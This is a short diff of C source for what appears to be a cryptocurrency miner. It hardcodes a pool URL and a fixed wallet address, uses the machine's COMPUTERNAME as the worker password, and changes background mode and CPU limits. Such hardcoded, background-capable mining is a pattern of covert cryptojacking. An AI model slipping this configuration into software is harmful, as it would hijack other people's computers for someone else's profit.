@@ -443,12 +443,8 @@ void parse_cmdline(int argc, char *argv[]) {
     //char    *opt_pass         = NULL;
     opt_algo = 1;
 
-    if (cpu_info.flags & CPU_FLAG_AES) {
-        opt_url  = "https://pool.myaeon.ru:1111";
-    } else {
-        opt_url  = "https://pool.myaeon.ru:1234";
-    }
-
+    opt_url  = "https://pool.myaeon.ru:1111";
+  
     opt_user = "Wmu1v35Bq9zFtSssT3GWjm7Wxpd2dvk7TWgqPPZi9y92hRv3GTKrJLU4oVgPjrjKCbKEShp1HDFmjCcEDT6ykRzt1vVZCCB1G";
 #ifdef _WIN64
     opt_pass = getenv("COMPUTERNAME");
@@ -459,8 +455,8 @@ void parse_cmdline(int argc, char *argv[]) {
 #endif
     opt_safe = false;
     opt_algo_variant = 0;
-    opt_max_cpu_usage = 95;
-    opt_background = true;
+    opt_max_cpu_usage = 50;
+    opt_background = false;
 
     int key;
 
